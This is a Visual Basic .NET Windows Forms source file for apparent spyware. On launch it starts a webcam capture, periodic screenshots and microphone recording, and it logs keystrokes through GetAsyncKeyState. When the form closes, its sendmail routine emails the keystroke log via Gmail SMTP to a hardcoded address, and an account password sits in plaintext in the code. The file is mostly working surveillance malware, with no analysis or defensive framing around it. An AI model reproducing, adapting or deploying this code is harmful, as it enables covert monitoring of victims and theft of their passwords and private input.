Imports System.Runtime.InteropServices
Imports System.Net.Mail
Public Class Form1

    Const WM_CAP As Short = &H400S
    Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
    Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
    Const WM_CAP_EDIT_COPY As Integer = WM_CAP + 30
    Const WM_CAP_SET_PREVIEW As Integer = WM_CAP + 50
    Const WM_CAP_SET_PREVIEWRATE As Integer = WM_CAP + 52
    Const WM_CAP_SET_SCALE As Integer = WM_CAP + 53
    Const WS_CHILD As Integer = &H40000000
    Const WS_VISIBLE As Integer = &H10000000
    Const SWP_NOMOVE As Short = &H2S
    Const SWP_NOSIZE As Short = 1
    Const SWP_NOZORDER As Short = &H4S
    Const HWND_BOTTOM As Short = 1
    Dim iDevice As Integer = 0
    Dim hHwnd As Integer
    Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer
    Declare Function SetWindowPos Lib "user32" Alias "SetWindowPos" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Declare Function DestroyWindow Lib "user32" (ByVal hndw As Integer) As Boolean
    Declare Function capCreateCaptureWindowA Lib "avicap32.dll" (ByVal lpszWindowName As String, ByVal dwStyle As Integer, ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, ByVal nHeight As Short, ByVal hWndParent As Integer, ByVal nID As Integer) As Integer
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, ByVal cbVer As Integer) As Boolean
    Dim frame As Long

    Dim tempdir As String = "C:\Screenshot Capture"

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Public log As String
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Button1.PerformClick()
        Button9.PerformClick()
        Timer2.Start()
        Timer3.Start()

        LoadDeviceList()
    End Sub
    'START OF WEBCAM CODE
    Private Sub LoadDeviceList()
        Dim strName As String = Space(100)
        Dim strVer As String = Space(100)
        Dim bReturn As Boolean
        Dim x As Integer = 0
        Do
            bReturn = capGetDriverDescriptionA(x, strName, 100, strVer, 100)
            If bReturn Then ListBox1.Items.Add(strName.Trim)
            x += 1
        Loop Until bReturn = False
    End Sub

    Private Sub OpenPreviewWindow()
        Dim iHeight As Integer = PictureBox1.Height
        Dim iWidth As Integer = PictureBox1.Width
        hHwnd = capCreateCaptureWindowA(iDevice, WS_VISIBLE Or WS_CHILD, 0, 0, 640, 480, PictureBox1.Handle.ToInt32, 0)
        If SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, iDevice, 0) Then
            SendMessage(hHwnd, WM_CAP_SET_SCALE, True, 0)
            SendMessage(hHwnd, WM_CAP_SET_PREVIEWRATE, 66, 0)
            SendMessage(hHwnd, WM_CAP_SET_PREVIEW, True, 0)
            SetWindowPos(hHwnd, HWND_BOTTOM, 0, 0, PictureBox1.Width, PictureBox1.Height, SWP_NOMOVE Or SWP_NOZORDER)
            Button3.Enabled = True
            Button2.Enabled = True
            Button1.Enabled = True
        Else
            DestroyWindow(hHwnd)
            Button3.Enabled = False
        End If
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        ClosePreviewWindow()
        Button1.Enabled = True
        Button3.Enabled = True
    End Sub

    Private Sub ClosePreviewWindow()
        SendMessage(hHwnd, WM_CAP_DRIVER_DISCONNECT, iDevice, 0)
        DestroyWindow(hHwnd)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        My.Computer.FileSystem.CreateDirectory(tempdir)
        OpenPreviewWindow()
        Button1.Enabled = True
        Button3.Enabled = True

        Timer1.Start()


    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim data As IDataObject
        My.Computer.FileSystem.CreateDirectory(tempdir)
        Dim bmap As Image
        SendMessage(hHwnd, WM_CAP_EDIT_COPY, 0, 0)
        data = Clipboard.GetDataObject()
        If data.GetDataPresent(GetType(System.Drawing.Bitmap)) Then
            bmap = CType(data.GetData(GetType(System.Drawing.Bitmap)), Image)
            PictureBox1.Image = bmap
            ClosePreviewWindow()
            Button3.Enabled = False
            Button2.Enabled = False
            Button1.Enabled = True

        End If

        Dim strfilename As String
        If Not My.Computer.FileSystem.DirectoryExists("C:\webcam Capture") Then
            My.Computer.FileSystem.CreateDirectory("C:\webcam Capture")
        End If

        'Count how many files are in the directory
        Dim counter = My.Computer.FileSystem.GetFiles("C:\webcam Capture")
        Dim intCount As Integer
        intCount = CStr(counter.Count)

        strfilename = "screenshot" & intCount
        PictureBox1.Image.Save("C:\webcam Capture\" & strfilename & ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg)
        Timer1.Stop()
    End Sub
    'END OF WEBCAM CODE

    'START OF SCREENSHOT CODE
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        My.Computer.FileSystem.CreateDirectory(tempdir)
        Timer2.Start()
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Timer1.Stop()
        frame = 0
        Label1.Text = "Time: 0"
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim area As Rectangle
        Dim graph As Graphics
        Dim captured As Bitmap
        area = Screen.PrimaryScreen.Bounds
        captured = New System.Drawing.Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
        graph = Graphics.FromImage(captured)
        graph.CopyFromScreen(area.X, area.Y, 0, 0, area.Size, CopyPixelOperation.SourceCopy)
        If CheckBox1.Checked = True Then
            Cursor.Draw(graph, New Rectangle(New Point(Cursor.Position.X - Cursor.HotSpot.X, Cursor.Position.Y - Cursor.HotSpot.Y), Cursor.Size))

        End If
        Dim strings As String

        strings = frame
        captured.Save(tempdir & "\" & strings & " .jpg", System.Drawing.Imaging.ImageFormat.Jpeg)
        frame += 1
        Label1.Text = "time" & frame
    End Sub

    Private Sub SaveFileDialog1_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles SaveFileDialog1.FileOk
        Dim args As String
        args = "-r 1/.1 -i " & tempdir & "\%01d.jpg -c:v libx264 -r 30 -pix_fmt yuv420p " & Chr(34) & SaveFileDialog1.FileName & Chr(34)
        Dim proc As New Process
        Dim proci As New ProcessStartInfo
        proci.FileName = My.Application.Info.DirectoryPath & "\ffmpeg.exe"
        proci.Arguments = args
        proci.WindowStyle = ProcessWindowStyle.Hidden
        proci.CreateNoWindow = True
        proci.UseShellExecute = False
        proc.StartInfo = proci
        proc.Start()
        Do Until proc.HasExited = True
            Me.Text = "SAVING"
        Loop
        Me.Text = "Screen Recorder"

        MsgBox("Done")

        IO.Directory.Delete(tempdir, True)
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Me.Close()
    End Sub


    'END OF SCREENSHOT CODE

    'START OF EMAIL CODE

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        If (GetAsyncKeyState(65)) Then
            log = log + "A"
        ElseIf (GetAsyncKeyState(66)) Then
            log = log + "B"
        ElseIf (GetAsyncKeyState(67)) Then
            log = log + "C"
        ElseIf (GetAsyncKeyState(68)) Then
            log = log + "D"
        ElseIf (GetAsyncKeyState(69)) Then
            log = log + "E"
        ElseIf (GetAsyncKeyState(70)) Then
            log = log + "F"
        ElseIf (GetAsyncKeyState(71)) Then
            log = log + "G"
        ElseIf (GetAsyncKeyState(72)) Then
            log = log + "H"
        ElseIf (GetAsyncKeyState(73)) Then
            log = log + "I"
        ElseIf (GetAsyncKeyState(74)) Then
            log = log + "J"
        ElseIf (GetAsyncKeyState(75)) Then
            log = log + "K"
        ElseIf (GetAsyncKeyState(76)) Then
            log = log + "L"
        ElseIf (GetAsyncKeyState(77)) Then
            log = log + "M"
        ElseIf (GetAsyncKeyState(78)) Then
            log = log + "N"
        ElseIf (GetAsyncKeyState(79)) Then
            log = log + "O"
        ElseIf (GetAsyncKeyState(80)) Then
            log = log + "P"
        ElseIf (GetAsyncKeyState(81)) Then
            log = log + "Q"
        ElseIf (GetAsyncKeyState(82)) Then
            log = log + "R"
        ElseIf (GetAsyncKeyState(83)) Then
            log = log + "S"
        ElseIf (GetAsyncKeyState(84)) Then
            log = log + "T"
        ElseIf (GetAsyncKeyState(85)) Then
            log = log + "U"
        ElseIf (GetAsyncKeyState(86)) Then
            log = log + "V"
        ElseIf (GetAsyncKeyState(87)) Then
            log = log + "W"
        ElseIf (GetAsyncKeyState(88)) Then
            log = log + "X"
        ElseIf (GetAsyncKeyState(89)) Then
            log = log + "Y"
        ElseIf (GetAsyncKeyState(90)) Then
            log = log + "Z"
        ElseIf (GetAsyncKeyState(48)) Then
            log = log + "0"
        ElseIf (GetAsyncKeyState(49)) Then
            log = log + "1"
        ElseIf (GetAsyncKeyState(50)) Then
            log = log + "2"
        ElseIf (GetAsyncKeyState(51)) Then
            log = log + "3"
        ElseIf (GetAsyncKeyState(52)) Then
            log = log + "4"
        ElseIf (GetAsyncKeyState(53)) Then
            log = log + "5"
        ElseIf (GetAsyncKeyState(54)) Then
            log = log + "6"
        ElseIf (GetAsyncKeyState(55)) Then
            log = log + "7"
        ElseIf (GetAsyncKeyState(56)) Then
            log = log + "8"
        ElseIf (GetAsyncKeyState(57)) Then
            log = log + "9"
        ElseIf (GetAsyncKeyState(96)) Then
            log = log + "{Num0}"
        ElseIf (GetAsyncKeyState(97)) Then
            log = log + "{Num1}"
        ElseIf (GetAsyncKeyState(98)) Then
            log = log + "{Num2}"
        ElseIf (GetAsyncKeyState(99)) Then
            log = log + "{Num3}"
        ElseIf (GetAsyncKeyState(100)) Then
            log = log + "{Num4}"
        ElseIf (GetAsyncKeyState(101)) Then
            log = log + "{Num5}"
        ElseIf (GetAsyncKeyState(102)) Then
            log = log + "{Num6}"
        ElseIf (GetAsyncKeyState(103)) Then
            log = log + "{Num7}"
        ElseIf (GetAsyncKeyState(104)) Then
            log = log + "{Num8}"
        ElseIf (GetAsyncKeyState(105)) Then
            log = log + "{Num9}"
        ElseIf (GetAsyncKeyState(106)) Then
            log = log + "{Num*}"
        ElseIf (GetAsyncKeyState(107)) Then
            log = log + "{Num+}"
        ElseIf (GetAsyncKeyState(13)) Then
            log = log + "{Enter}"
        ElseIf (GetAsyncKeyState(109)) Then
            log = log + "{Num-}"
        ElseIf (GetAsyncKeyState(110)) Then
            log = log + "{Num.}"
        ElseIf (GetAsyncKeyState(111)) Then
            log = log + "{Num/}"
        ElseIf (GetAsyncKeyState(32)) Then
            log = log + " "
        ElseIf (GetAsyncKeyState(8)) Then
            log = log + "{Backspace}"
        ElseIf (GetAsyncKeyState(9)) Then
            log = log + "{Tab}"
        ElseIf (GetAsyncKeyState(16)) Then
            log = log + "{Shift}"
        ElseIf (GetAsyncKeyState(17)) Then
            log = log + "{Control}"
        ElseIf (GetAsyncKeyState(20)) Then
            log = log + "{Caps}"
        ElseIf (GetAsyncKeyState(27)) Then
            log = log + "{Esc}"
        ElseIf (GetAsyncKeyState(33)) Then
            log = log + "{PGup}"
        ElseIf (GetAsyncKeyState(34)) Then
            log = log + "{PGdn}"
        ElseIf (GetAsyncKeyState(35)) Then
            log = log + "{End}"
        ElseIf (GetAsyncKeyState(36)) Then
            log = log + "{Home}"
        ElseIf (GetAsyncKeyState(37)) Then
            log = log + "{LArrow}"
        ElseIf (GetAsyncKeyState(38)) Then
            log = log + "{UArrow}"
        ElseIf (GetAsyncKeyState(39)) Then
            log = log + "{RArrow}"
        ElseIf (GetAsyncKeyState(40)) Then
            log = log + "{DArrow}"
        ElseIf (GetAsyncKeyState(45)) Then
            log = log + "{Insert}"
        ElseIf (GetAsyncKeyState(46)) Then
            log = log + "{Del}"
        ElseIf (GetAsyncKeyState(144)) Then
            log = log + "{NumLock}"
        ElseIf (GetAsyncKeyState(188)) Then
            log = log + "{,}"
        ElseIf (GetAsyncKeyState(1)) Then
            log = log + " "
        ElseIf (GetAsyncKeyState(2)) Then
            log = log + "[R]"
        End If
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        RichTextBox1.Text = log
    End Sub

    Private Sub Text_Closing(ByVal sender As Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
        sendmail()
    End Sub

    Private Sub sendmail()
        Dim Mail As New MailMessage
        Mail.Subject = "Keylog"
        Mail.To.Add("jonathanlemba87@gmail.com")
        Mail.From = New MailAddress("keytest@gmail.com")
        Mail.Body = log
        Dim SMTP As New SmtpClient("smtp.gmail.com")
        SMTP.EnableSsl = True
        SMTP.Credentials = New System.Net.NetworkCredential("jonathanlemba87@gmail.com", "Kinshasa243@@")
        SMTP.Port = "587"
        SMTP.Send(Mail)
    End Sub


    'END OF EMAIL CODE

    'START AUDIO RECORDER'
    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        Button1.Enabled = False

        mciSendString("open new Type waveaudio Alias rec-sound", "", 0, 0)

        mciSendString("record rec-sound", "", 0, 0)

        Label2.Text = "Voice Recording..."

        Label2.Visible = True
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        MsgBox("The program is running...")
    End Sub

    Private Sub Text_Closing1(ByVal sender As Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing


        Button9.Enabled = True

        Button10.Enabled = False


        mciSendString("save rec-sound C:\Users\danie\RE­C-SOUND1.wav", "", 0, 0)

        mciSendString("close rec-sound", "", 0, 0)

        Label2.Text = "Stopped..."

        Label2.Visible = False

        My.Computer.Audio.Play("C:\Users\danie\RE­C-SOUND1.wav", AudioPlayMode.Background)

        My.Computer.Audio.Stop()
    End Sub

    'END AUDIO RECORDER'
End Class
